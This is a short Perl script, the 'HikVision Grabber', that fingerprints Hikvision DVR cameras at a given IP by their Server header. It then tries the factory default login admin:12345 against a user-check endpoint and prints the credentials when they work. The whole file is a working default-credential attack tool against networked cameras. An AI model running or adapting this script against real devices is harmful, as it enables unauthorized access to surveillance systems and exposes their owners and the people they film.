#!/usr/bin/perl
# Tested on hikvsion DVR4D Camera

use LWP::UserAgent;

system $^O eq 'MSWin32' ? 'cls' : 'clear';

print "\t\n       HikVision Grabber\n\n\n";


my $ua = LWP::UserAgent->new();

$ua->agent("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");

my $req = $ua->get("http://".$ARGV[0]."/")->header('server');

if($req =~/DNVRS-Webs/ || $req =~/DVRDVS-Webs/) {


print " [".$ARGV[0]."] => HikVision Detected \n";

   print "  [".$ARGV[0]."] => Testing Default Password \n";

$ua->default_header('X-Requested-With' => "XMLHttpRequest");
$ua->default_header('Authorization' => "Basic YWRtaW46MTIzNDU=");

$req2 = $ua->get("http://".$ARGV[0]."/PSIA/Custom/SelfExt/userCheck");

if($req2->content =~/<statusValue>200<\/statusValue>/) {

	print "    ".$ARGV[0]." => admin:12345 \n";

}
}
